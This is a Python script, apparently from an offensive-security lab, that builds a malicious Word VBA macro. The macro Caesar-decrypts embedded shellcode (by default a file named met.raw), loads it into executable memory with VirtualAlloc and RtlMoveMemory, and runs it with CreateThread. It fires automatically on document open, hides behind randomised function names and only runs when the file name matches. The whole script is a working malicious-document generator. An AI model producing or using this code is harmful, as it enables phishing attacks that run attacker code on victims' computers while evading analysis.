from common.shellcode_formator import to_vba_array
from common.encrypt_utils import EncryptUtils, Algorithm
import sys


def encrypt_string(string, key):
    output = ""
    for c in string:
        output += '{0:03}'.format((ord(c) + key) % 256)
    return output


template = """
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function EshuuT2EeM(DaiPaephoo)
    EshuuT2EeM = Chr(DaiPaephoo - %(decryption_key)s)
End Function

Function GahchiShei(QuohkeeQuu)
    GahchiShei = Left(QuohkeeQuu, 3)
End Function

Function DaseshahYa(ThaoXeijak)
    DaseshahYa = Right(ThaoXeijak, Len(ThaoXeijak) - 3)
End Function

Function Raabajomai(Thotohcoob)
    Do
        ExaiPodeeR = ExaiPodeeR + EshuuT2EeM(GahchiShei(Thotohcoob))
        Thotohcoob = DaseshahYa(Thotohcoob)
    Loop While Len(Thotohcoob) > 0
    Raabajomai = ExaiPodeeR
End Function

Function MyMacro()
    If ActiveDocument.Name <> Raabajomai("%(encrypted_docname)s") Then
        Exit Function
    End If
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = %(encrypted_shellcode)s

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - %(decryption_key)s
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

def read_shellcode_file(shellcode_fp):
    with open(shellcode_fp, 'rb') as f:
        return f.read()

def get_code(docname, shellcode_fp, key):
    encrypted_docname = encrypt_string(docname, key)
    shellcode = read_shellcode_file(shellcode_fp)
    enc_utils = EncryptUtils(Algorithm.CAESAR, key)
    encrypted_shellcode = to_vba_array(enc_utils.encrypt(shellcode))
    output = template % {'encrypted_docname': encrypted_docname, 'encrypted_shellcode': encrypted_shellcode, 'decryption_key': str(key)}
    print(output)


key = 17
docname = "app.doc"
shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(docname, shellcode_path, key)